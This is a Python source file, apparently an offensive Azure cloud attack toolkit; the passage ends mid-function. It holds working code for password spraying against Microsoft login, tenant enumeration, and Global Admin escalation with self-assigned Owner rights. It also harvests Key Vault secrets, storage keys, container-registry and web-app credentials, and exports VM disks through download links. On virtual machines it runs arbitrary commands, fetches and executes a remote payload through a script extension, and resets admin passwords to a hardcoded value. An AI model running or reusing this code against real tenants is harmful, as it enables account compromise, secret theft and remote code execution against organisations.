import base64
import json, sys
import uuid
import os
import uuid
import random
import string
import http.client
import urllib
import subprocess
from urllib.parse import urlparse
from xml.dom.minidom import parse
from xml.dom.minidom import parseString
import xml.dom.minidom
import ssl, re

Token = None
RefreshToken = None
RefreshTokenGraph = None
AutoGenToken = False
accessTokenGraph = None
accessTokenVault = None
storageAccessToken = None
TotalTargets = []
TargetSubscription = None
TargetTenantId = None
ExploitChoosen = None
hasGraphAccess = False
hasMgmtAccess = False
hasVaultEnabled = False
TrackLog = []

# Adapted From http://stackoverflow.com/questions/5909873/how-can-i-pretty-print-ascii-tables-with-python
def make_table(columns, data):
    """Create an ASCII table and return it as a string.

    Pass a list of strings to use as columns in the table and a list of
    dicts. The strings in 'columns' will be used as the keys to the dicts in
    'data.'

    """
    # Calculate how wide each cell needs to be
    cell_widths = {}
    for c in columns:
        lens = []
        values = [lens.append(len(str(d.get(c, "")))) for d in data]
        lens.append(len(c))
        lens.sort()
        cell_widths[c] = max(lens)

    # Used for formatting rows of data
    row_template = "|" + " {} |" * len(columns)

    # CONSTRUCT THE TABLE

    # The top row with the column titles
    justified_column_heads = [c.ljust(cell_widths[c]) for c in columns]
    header = row_template.format(*justified_column_heads)
    # The second row contains separators
    sep = "|" + "-" * (len(header) - 2) + "|"
    end = "-" * len(header)
    title = "-" * len(header)
    # Rows of data
    rows = []

    for d in data:
        fields = [str(d.get(c, "")).ljust(cell_widths[c]) for c in columns]
        row = row_template.format(*fields)
        rows.append(row)
    rows.append(end)
    return "\n".join([title,header, sep] + rows)

def sendGETRequest(url, Token):
    object = {}
    o = urlparse(url)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + str(Token)
    }
    conn.request("GET", str(o.path) + "/?" + str(o.query), "", headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object


def sendPOSTRequestXMLAutoDiscover(url, body):
    object = {}
    o = urlparse(url)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        "Content-Type" : "text/xml; charset=utf-8",
        "SOAPAction" :   '"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"',
        "User-Agent" :   "AutodiscoverClient"
    }
    conn.request("POST", str(o.path) + "/?" + str(o.query), body.encode('utf-8'), headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object


def sendPOSTRequest(url, body, Token):
    object = {}
    o = urlparse(url)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + str(Token)
    }
    if body is not None:
        body = json.dumps(body)
    conn.request("POST", str(o.path) + "/?" + str(o.query), body, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object


def sendPOSTRequestSprayMSOL(url, user, pwd, resourceMgmt):
    object = {}
    o = urlparse(url)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
        'client_info': '1',
        'grant_type': 'password',
        'username': user,
        'password': pwd,
        'scope': 'openid'
    }
    if resourceMgmt:
        data['resource'] = 'https://management.azure.com/'
    else:
        data['resource'] = 'https://graph.windows.net'
    qs = urllib.parse.urlencode(data)
    conn.request("POST", str(o.path) + "/?" + str(o.query), qs, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object

def sendPOSTRequestRefreshToken(tenantId, token):
    object = {}
    o = urlparse("https://login.microsoftonline.com/"+str(tenantId)+"/oauth2/v2.0/token")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'grant_type': 'refresh_token',
        'refresh_token': token,
    }
    qs = urllib.parse.urlencode(data)
    conn.request("POST", str(o.path), qs, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object

def sendPOSTRequestSPToken(tenantId, clientId, secretToken):
    object = {}
    o = urlparse("https://login.microsoftonline.com/"+str(tenantId)+"/oauth2/v2.0/token")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'grant_type': 'client_credentials',
        'client_id': clientId,
        'scope': '.default',
        'client_secret': secretToken,
    }
    qs = urllib.parse.urlencode(data)
    conn.request("POST", str(o.path), qs, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object

def DeviceCodeFlow():
    object = {}
    o = urlparse("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'client_id' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
        'scope' : 'User.Read Users.Read openid profile offline_access',
        'code': 'AAAA'
    }
    qs = urllib.parse.urlencode(data)
    conn.request("POST", str(o.path), qs, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object

def DeviceCodeFlowAuthUser(teantnId, deviceCode):
    object = {}
    o = urlparse("https://login.microsoftonline.com/"+str(teantnId)+"/oauth2/v2.0/token")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'tenant': teantnId,
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
        'client_id' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        'device_code': deviceCode
    }
    qs = urllib.parse.urlencode(data)
    conn.request("POST", str(o.path), qs, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object

def sendPUTRequest(url, body, Token):
    object = {}
    o = urlparse(url)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + str(Token)
    }
    if body is not None:
        body = json.dumps(body)
    conn.request("PUT", str(o.path) + "/?" + str(o.query), body, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object

def get_random_string(size):
    chars = string.ascii_lowercase+string.ascii_uppercase+string.digits
    ''.join(random.choice(chars) for _ in range(size))
    return chars

def parseUPN():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        data = json.loads(base64.b64decode(b64_string))
        if 'app_displayname' in data:
            return data['app_displayname'] + "@" + data['tid'] 
        return data['upn']

def parseUPNObjectId():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        return json.loads(base64.b64decode(b64_string))['oid']

def parseTenantId():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        return json.loads(base64.b64decode(b64_string))['tid']

def hasTokenInPlace():
    global Token
    if Token is None:
        return False
    else:
        return True

def setToken(token):
    global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled
    if token == "":
        hasMgmtAccess = False
        hasGraphAccess = False
        hasVaultEnabled = False
    else:
        Token = token


def initRefreshToken(TokenRF):
    global RefreshToken
    RefreshToken = TokenRF

def initRefreshGraphToken(TokenRFGraph):
    global RefreshTokenGraph
    RefreshTokenGraph = TokenRFGraph

def initTokenWithGraph(token, graphToken):
    global Token, accessTokenGraph,TargetSubscription, hasVaultEnabled, TargetTenantId, hasGraphAccess, hasMgmtAccess
    hasGraphAccess = True
    hasVaultEnabled = False
    hasMgmtAccess = True
    Token = token
    accessTokenGraph = graphToken
    try:
        listSubs = ListSubscriptionsForToken()
        TargetSubscription = listSubs['value'][0]['subscriptionId']
        TargetTenantId = parseTenantId()
    except KeyError:
        pass

def initToken(token, resetscopes):
    global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled,TargetSubscription, TargetTenantId
    if resetscopes:
        hasMgmtAccess = False
        hasGraphAccess = False
        hasVaultEnabled = False
    Token = token
    try:
        listSubs = ListSubscriptionsForToken()
        TargetSubscription = listSubs['value'][0]['subscriptionId']
        TargetTenantId = parseTenantId()
    except KeyError:
        pass


def originitToken(token):
    check = token.split(".")[1]
    audAttribue = json.loads(base64.b64decode(check))['aud']
    if audAttribue != "https://management.azure.com/":
        print(
            "ERROR: Invalid audiance in token, please generate a token with correct audiance. Expected: https://management.azure.com/, provided " + audAttribue + " .")
        sys.exit(-1)
    else:
        print("All set.")
        global Token, hasMgmtAccess
        hasMgmtAccess = True
        Token = token

def currentScope():
    global hasMgmtAccess, hasGraphAccess, hasVaultEnabled
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        audAttribue = json.loads(base64.b64decode(b64_string))['aud']
        strA = []
        if hasGraphAccess or "graph.microsoft.com" in audAttribue:
            strA.append("Graph enabled")
        if hasMgmtAccess or "management.azure.com" in audAttribue:
            strA.append("Azure RABC enabled")
        if hasVaultEnabled or 'vault.azure.net' in audAttribue:
            strA.append("Vault enabled")
        print("Enabled Scope(s): " + str(" | ").join(strA))

def currentProfile():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        strigify = parseUPN().split("@")
        if Token == None:
            print("Please load a token.")
        else:
            print(strigify[1] + "\\" + strigify[0])

def ENUM_MSOLSpray(username,password):
    r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", username, password, False)
    if r["status_code"] == 200:
        return True
    else:
        error = r["response"]
        if "AADSTS50126" in error:
            return "Invalid password."
        elif "AADSTS50128" in error or "AADSTS50059" in error:
            return "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services."
        elif "AADSTS50034" in error:
            return "The user doesn't exist."
        elif "AADSTS50079" in error or "AADSTS50076" in error:
            return "Credential valid however the response indicates MFA (Microsoft) is in use."
        elif "AADSTS50158" in error:
            return "Credential valid however the response indicates conditional access (MFA: DUO or other) is in use."
        elif "AADSTS50053" in error:
            return "The account appears to be locked."
        elif "AADSTS50057" in error:
            return "The account appears to be disabled."
        elif "AADSTS50055" in error:
            return "Credential valid however the user's password is expired."
        else:
            return "Got unknown error"


def ReloadToken():
    global RefreshToken
    r = sendPOSTRequestRefreshToken(parseTenantId(), RefreshToken )
    response = r["json"]
    if 'access_token' in response:
        initToken(response['access_token'], True)
        initRefreshToken(response['refresh_token'])

'''
 The method used to check token state and refresh if needed
 TBD: Implement same logic for other methods as well
'''     
def CheckSubscriptionReqState():
    global Token
    r = ListSubscriptionsForToken()
    if len(r) == 0:
        ReloadToken()
        internal = ListSubscriptionsForToken()
        return internal
    else:
        return r

'''
 The method used to check token state for graph based methods
'''     
def CheckSubscriptionReqGraphState():
    global accessTokenGraph
    r = sendGETRequest("https://graph.microsoft.com/v1.0/users/", accessTokenGraph)
    if len(r['json']) == 0:
        return False
    else:
        return True

''' Based on AADInternals Research (https://aadinternals.com/post/just-looking/) '''

def ENUM_Tenant_Info(domain):
    r = sendGETRequest("https://login.microsoftonline.com/"+domain+"/.well-known/openid-configuration", None)
    return r["json"]

def ENUM_Tenant_Login_Info(domain):
    r = sendGETRequest("https://login.microsoftonline.com/getuserrealm.srf?login=" + domain + "&xml=1", None)
    DOMTree = xml.dom.minidom.parseString(r["response"])
    RealmInfo = DOMTree.getElementsByTagName("RealmInfo")
    return RealmInfo

def ENUM_Tenant(domain):
    autodiscover_post_body = """<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
        <soap:Header>
            <a:Action soap:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation</a:Action>
            <a:To soap:mustUnderstand="1">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc</a:To>
            <a:ReplyTo>
                <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
            </a:ReplyTo>
        </soap:Header>
        <soap:Body>
            <GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
                <Request>
                    <Domain>""" + domain + """</Domain>
                </Request>
            </GetFederationInformationRequestMessage>
        </soap:Body>
    </soap:Envelope>"""
    r = sendPOSTRequestXMLAutoDiscover("https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc", autodiscover_post_body)
    result = []
    DomainIntel = ENUM_Tenant_Info(domain)
    DOMTree = xml.dom.minidom.parseString(r["response"])
    domains = DOMTree.getElementsByTagName("Domain")
    for domain in domains:
        currentDomain = domain.firstChild.data
        dataIntel = ENUM_Tenant_Login_Info(currentDomain)
        for intel in dataIntel:
            NameSpaceType = intel.getElementsByTagName("NameSpaceType")[0].childNodes[0].nodeValue
            IsFederatedNS = intel.getElementsByTagName("IsFederatedNS")[0].childNodes[0].nodeValue
            FederationBrandName = intel.getElementsByTagName("FederationBrandName")[0].childNodes[0].nodeValue
            CloudInstanceName = intel.getElementsByTagName("CloudInstanceName")[0].childNodes[0].nodeValue
            result.append({
                'Location': DomainIntel['tenant_region_scope'],
                'domain': currentDomain,
                'NSType': NameSpaceType,
                'FederationBrandName': FederationBrandName,
                'IsFederatedNS': bool(IsFederatedNS),
                'TenantId': re.findall("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", DomainIntel['token_endpoint'])[0],
                'CloudName': CloudInstanceName
            })
    return result

def ContainerACL(storageAccount):
    global storageAccessToken
    r = sendGETRequest("https://"+storageAccount+".blob.core.windows.net/dev?restype=container&comp=acl", accessTokenGraph)
    return r["status_code"]

def RD_ListAllUsers():
    global accessTokenGraph
    if CheckSubscriptionReqGraphState():
        r = sendGETRequest("https://graph.microsoft.com/v1.0/users/", accessTokenGraph)
        return r["json"]
    else:
        print("Need to refresh token / obtain token for MSGraph.")

def GA_ElevateAccess():
    global Token
    r = sendPOSTRequest("https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01", None, Token)
    result = r['response']
    if result == "":
        return "Exploit Success!"
    else:
        return "Exploit Failed."

def GA_AssignSubscriptionOwnerRole(subscriptionId):
    global Token
    r = sendPUTRequest(
        "https://management.azure.com/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2015-07-01",
        {
              "properties": {
                "roleDefinitionId": "/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
                "principalId": str(parseUPNObjectId())
              }
        },Token)
    result = r['json']
    if result['error']:
        return "Exploit Failed. Abort."
    else:
        return "Exploit Completed! You're Subscription Owner on SubscriptionId=" + str(subscriptionId)


def RD_AddAppSecret():
    global accessTokenGraph
    if CheckSubscriptionReqGraphState():
        r = sendGETRequest("https://graph.microsoft.com/v1.0/applications", accessTokenGraph)
        return r['json']
    else:
        print("Need to refresh token / obtain token for MSGraph.")

def getResGroup(subid):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/"+subid+"/resourcegroups?api-version=2021-04-01", Token)
    return r['json']


def getArmTempPerResGroup(subid,resgroup):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/"+subid+"/resourcegroups/"+resgroup+"/providers/Microsoft.Resources/deployments/?api-version=2021-04-01", Token)
    return r['json']

def RD_ListExposedWebApps():
    global Token
    result = []
    listSubs = CheckSubscriptionReqState()
    for subRecord in listSubs['value']:
        for res in getResGroup(subRecord['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+subRecord['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Web/sites?api-version=2022-03-01", Token)
            if len(rsVM['json']) == 0:
                continue
            else:
                for item in rsVM['json']['value']:
                    if 'identity' not in item:
                        item['identity'] = "N/A"

                    item['subscriptionId'] = subRecord['subscriptionId']
                    item['resourceGroup'] = res['name']
                    result.append(item)
    return result

def RD_ListAllDeployments():
    global Token
    result = []
    listSubs = CheckSubscriptionReqState()
    for subRecord in listSubs['value']:
        rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+subRecord["subscriptionId"]+"/providers/Microsoft.Web/sites?api-version=2022-03-01", Token)
        if len(rsVM['json']) == 0:
            continue
        else:
            for item in rsVM['json']['value']:
                result.append(item)
    return result

def RD_ListAllACRs():
    global Token
    result = []
    listSubs = CheckSubscriptionReqState()
    for subRecord in listSubs['value']:
        rsub = sendGETRequest("https://management.azure.com/subscriptions/"+subRecord['subscriptionId']+"/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01", Token)
        if len(rsub) == 0:
            continue
        else:
            result.append(rsub['json'])
    return result

def HLP_GetACRCreds(acrId):
    global Token
    r = sendGETRequest("https://management.azure.com/"+acrId+"/listCredentials?api-version=2019-05-01", Token)
    if r["status_code"] == 200:
        return r['json']
    else:
        return "Unable to fetch data ACR."

def HLP_ReadVaultSecretContent(SecretIdLink):
    global accessTokenVault
    rs = sendGETRequest(SecretIdLink+"?api-version=7.3",accessTokenVault)
    if rs['status_code'] == 200:
        return "OK|" + rs['json']['value']
    else:
        return "ERROR|Operation Failed: " + rs['json']['error']['message']

def HLP_AddVaultACL(vaultId):
    global Token
    rs = sendPUTRequest(
        "https://management.azure.com/" + vaultId + "/accessPolicies/add?api-version=2021-10-01",
        {
              "properties": {
                "accessPolicies": [
                  {
                    "tenantId": parseTenantId(),
                    "objectId": parseUPNObjectId(),
                    "permissions": {
                      "keys": [
                        "encrypt"
                      ],
                      "secrets": [
                        "get",
                        "list"
                      ],
                      "certificates": [
                        "get",
                        "list"
                      ]
                    }
                  }
                ]
              }
            },Token)
    if rs['status_code'] == 201 or rs['status_code'] == 200:
        return True
    else:
        return False

def HLP_GetSecretsInVault(vaultName):
    global accessTokenVault
    rs = sendGETRequest(
        "https://"+str(vaultName).lower()+".vault.azure.net/secrets?api-version=7.3",
        accessTokenVault)
    if rs['status_code'] == 200:
        return "OK|"
    else:
        return "ERROR|Operation Failed: " + rs['json']['error']['message']

def HLP_GetSecretsInVaultNoStrings(vaultName):
    global accessTokenVault
    rs = sendGETRequest("https://"+str(vaultName).lower()+".vault.azure.net/secrets?api-version=7.3", accessTokenVault)
    if rs["status_code"] == 200:
        return rs['json']['value']
    else:
        return rs['json']['error']['message']

def HLP_GetSecretValueTXT(vaultSecretId):
    global accessTokenVault
    rs = sendGETRequest(vaultSecretId+"?api-version=7.3",accessTokenVault)
    if rs['status_code'] == 200:
        return rs['json']['value']
    else:
        return rs['json']['error']['message']

def HLP_GetVMInstanceView(subscriptionId,resourceGroupName,vmName):
    global Token
    rs = sendGETRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/instanceView?api-version=2022-08-01", Token)
    if rs['status_code'] == 200:
        return rs['json']['statuses'][1]['code']
    else:
        return "Unable to fetch VM data."

def RD_ListAllVMs():
    global Token
    result = []
    listSubs = CheckSubscriptionReqState()
    for subRecord in listSubs['value']:
        for res in getResGroup(subRecord['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+subRecord['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", Token)
            if len(rsVM['json']) == 0:
                continue
            else:
                for item in rsVM['json']['value']:
                    if 'identity' not in item:
                        item['identity'] = "N/A"

                    item['subscriptionId'] = subRecord['subscriptionId']
                    item['resourceGroup'] = res['name']
                    result.append(item)
    return result

def RD_ListAllVaults():
    global Token
    result = []
    listSubs = CheckSubscriptionReqState()
    for subRecord in listSubs['value']:
        for res in getResGroup(subRecord['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+subRecord['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01", Token)
            for item in rsVM['json']['value']:
                item['subscriptionId'] = subRecord['subscriptionId']
                item['resourceGroup'] = res['name']
                result.append(item)
    return result

def RD_ListAllStorageAccountsKeys(AccId):
    global Token
    r = sendPOSTRequest("https://management.azure.com/"+AccId+"/listKeys?api-version=2022-05-01", None, Token)
    return r['json']

def RD_ListAllStorageAccounts():
    global Token
    result = []
    listSubs = CheckSubscriptionReqState()
    for subRecord in listSubs['value']:
        for res in getResGroup(subRecord['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+subRecord['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01", Token)
            if len(rsVM['json']) == 0:
                return result
            else:
                for item in rsVM['json']['value']:

                    item['subscriptionId'] = subRecord['subscriptionId']
                    item['resourceGroup'] = res['name']

                    if 'allowSharedKeyAccess' not in item['properties']:
                        item['allowSharedKeyAccess'] = "N/A"
                    else:
                        item['allowSharedKeyAccess'] = item['properties']['allowSharedKeyAccess']

                    if 'customDomain' not in item['properties']:
                        item['customDomain'] = "N/A"
                    else:
                        item['customDomain'] = item['properties']['customDomain']

                    result.append(item)
            return result

def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName):
    global Token
    req = {
        "access": "read",
        "durationInSeconds": 86400
    }
    rs = sendPOSTRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/disks/"+vmDiskName+"/beginGetAccess?api-version=2022-03-02", req, Token)
    if rs['status_code'] == 202:
        rsAsync = sendGETRequest(str(rs['headers']['Location']),Token)
        return "Disk Ready! The SAS Download For the next 24 hours (Disk:" + vmDiskName + "): " + rsAsync['json']['accessSAS']
    else:
        return "Failed to generate SAS link for Disk."

def CON_GetPublishProfileBySite(SiteId):
    global Token
    output = []
    rs = sendPOSTRequest("https://management.azure.com/"+SiteId+"/publishxml?api-version=2022-03-01", None, Token)
    rsConf = sendGETRequest("https://management.azure.com/"+SiteId+"/config/web?api-version=2022-03-01", Token)
    if rs["status_code"] == 200:
        DOMTree = xml.dom.minidom.parseString(rs["response"])
        xmlContent = DOMTree.documentElement
        profiles = xmlContent.getElementsByTagName('publishProfile')

        if rsConf["status_code"] == 200:
            connectionStrings = rsConf['json']['properties']['connectionStrings']
            if connectionStrings is not None:
                output.append(
                    {"name": "ConnectionStrings", "user": str("\n".join(connectionStrings)), "pwd": "", "host": ""})

        for profile in profiles:
            name = profile.getAttribute('profileName')
            host = profile.getAttribute('publishUrl')
            user = profile.getAttribute('userName')
            pwd = profile.getAttribute('userPWD')
            sqlConnectionString = profile.getAttribute('SQLServerDBConnectionString')
            mySQLConnectionString = profile.getAttribute('mySQLDBConnectionString')
            output.append({"name": name, "user": user, "pwd": pwd, "host": host})
            if sqlConnectionString != "":
                output.append({"name": "SQLServerDB", "user": sqlConnectionString, "pwd": "", "host": ""})
            if mySQLConnectionString != "":
                output.append({"name": "MySQLServerDB", "user": mySQLConnectionString, "pwd": "", "host": ""})
        return output
    else:
        return "Failed to parse deployment template"

def CON_VMExtensionExecution(subscriptionId, location, resourceGroupName, vmName, PayloadURL):
    global Token
    vmExtensionName = get_random_string(20)
    r = sendPUTRequest(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/" + resourceGroupName + "/providers/Microsoft.Compute/virtualMachines/" + vmName + "/extensions/" + vmExtensionName + "?api-version=2022-08-01",
        {
            "location": location,
            "properties": {
                "publisher": "Microsoft.Compute",
                "typeHandlerVersion": "1.0",
                "type": "CustomScriptExtension",
                "autoUpgradeMinorVersion": True,
                "protectedSettings": {
                    "commandToExecute": os.path.basename(urlparse(PayloadURL).path),
                    "fileUris": [PayloadURL]
                }
            }
        },Token)
    if r['status_code'] == 201:
        return "Created! It should be ready within 5-10 min."
    else:
        return "Failed to create VM Extension.\nReason: " + str(r['json']['error']['message'])

def CON_VMRunCommand(subscriptionId, resourceGroupName, osType, vmName, Command):
    global Token

    if osType == "Windows":
        exec = "RunPowerShellScript"
    else:
        exec = "RunShellScript"

    req = {
        "commandId": exec,
        "script": [Command]
    }
    rs = sendPOSTRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/runCommand?api-version=2022-08-01",req, Token)
    if rs['status_code'] == 202:
        rsAsync = sendGETRequest(str(rs['headers']['Location']),Token)
        print("Running command...")
        while(True):
            x = sendGETRequest(str(rsAsync['headers']['Location']),Token)
            if x["status_code"] != 200:
                continue
            else:
                if 'message' in x["json"]:
                    print(x["json"]["message"])
                break
    else:
        return "Failed to Create Shell Script."


def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName, adminAccount):
    global Token
    vmExtensionName = "RandomExtNas" + get_random_string(8)
    r = sendPUTRequest(
        "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/extensions/"+vmExtensionName+"?api-version=2022-08-01",
        {
              "location": location,
              "properties": {
                "publisher": "Microsoft.Compute",
                "typeHandlerVersion": "2.0",
                "type": "VMAccessAgent",
                "autoUpgradeMinorVersion": True,
                "protectedSettings": {
                    "password": "secretPass123"
                }
              }
            },Token)
    if r['status_code'] == 201:
        return "Created! It should be ready within 5-10 min. \nLogin to "+vmName+" using " + adminAccount + ":secretPass123 as login details."
    else:
        return "Failed to create VM Extension.\nReason: " + str(r['json']['error']['message'])

def RD_ListAutomationAccounts():
    global Token
    result = []
    r = CheckSubscriptionReqState()
    if len(r['json']) == 0:
        return result
    else:
        for sub in r['json']['value']:
            rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
            for item in rsub['json']['value']:
                item['subscriptionId'] = sub['subscriptionId']
                result.append(item)
        return result

def RD_ListRunBooksByAutomationAccounts():
    global Token
    result = []
    listSubs = CheckSubscriptionReqState()
    for subRecord in listSubs['value']:
        pathToAutomationAccount = sendGETRequest("https://management.azure.com/subscriptions/"+subRecord['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
        if len(pathToAutomationAccount['json']) == 0:
            continue
        else:
            for automationAccount in pathToAutomationAccount['json']['value']:
                GetRunBook = sendGETRequest("https://management.azure.com/" + str(automationAccount['id']) + "/runbooks?api-version=2019-06-01", Token)
                for item in GetRunBook['json']['value']:
                    item['subscriptionId'] = str(subRecord['subscriptionId'])
                    item['automationAccount'] = str(automationAccount['name'])
                    result.append(item)
    return result

def RD_ListARMTemplates():
    global Token
    finalResult = []
    listSubs = CheckSubscriptionReqState()
    for subRecord in listSubs['value']:
        for res in getResGroup(subRecord['subscriptionId'])['value']:
            for template in getArmTempPerResGroup(subRecord['subscriptionId'], res['name'])['value']:
                currenttemplate = template
